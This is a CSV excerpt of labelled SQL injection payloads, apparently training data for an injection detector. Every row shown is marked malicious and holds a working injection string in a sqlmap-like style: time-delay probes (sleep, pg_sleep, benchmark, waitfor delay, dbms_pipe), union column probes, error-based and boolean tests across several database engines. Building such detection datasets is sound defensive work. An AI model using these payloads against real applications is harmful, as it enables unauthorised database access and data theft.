row_index,payload_norm,label,sqli_type_hint
4050,"-1270'|| ( select 'mgdi' where 6785 = 6785 union all select 6785,6785#",1,
4051,"1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""sdps"" = ""sdps",1,
4052,"1"" or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1,
4053,1%' ) ) ) rlike ( select ( case when ( 7697 = 3334 ) then 1 else 0x28 end ) ) and ( ( ( '%' = ',1,
4054,"1'|| ( select 'ymac' from dual where 9268 = 9268 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) ||'",1,
4055,waitfor delay '0:0:5' and ( 'gpqx' like 'gpqx,1,
4056,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",1,
4057,1%' ) ) ) and 7533 = 7533 and ( ( ( '%' = ',1,
4058,1' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'bwka' = 'bwka,1,
4059,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",1,
4060,"1"" ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ""tbdl"" like ""tbdl",1,
4061,"1"" ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""ecoa"" like ""ecoa",1,
4062,"1%"" ) rlike sleep ( 5 ) #",1,
4063,"1' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 'gtov' like 'gtov",1,
4064,1' in boolean mode ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) #,1,
4065,"1' ) ) as qwdh where 7581 = 7581 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
4066,select case when 3661 = 9315 then 1 else null end--,1,
4067,"1'+ ( select 'asmj' where 7808 = 7808 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) +'",1,
4068,"-1513"" ) as swvd where 2958 = 2958 union all select 2958,2958,2958--",1,
4069,-2951 or 4189 = 2291,1,
4070,"1' in boolean mode ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) #",1,
4071,"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1,
4072,1'|| ( select 'ytwz' from dual where 3025 = 3025 and ( 5039 = 5303 ) *5303 ) ||',1,
4073,end and ( 9416 = 9416,1,
4074,"1%' ) union all select null,null,null,null#",1,
4075,"select * from generate_series ( 7536,7536,case when ( 7536 = 7523 ) then 1 else 0 end ) limit 1--",1,
4076,"1"" ) ) as femc where 1313 = 1313 and 4595 = 4595#",1,
4077,"1"" where 4298 = 4298 order by 1--",1,
4078,-1468' ) ) ) or 4875 = 6163#,1,
4079,"1 ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
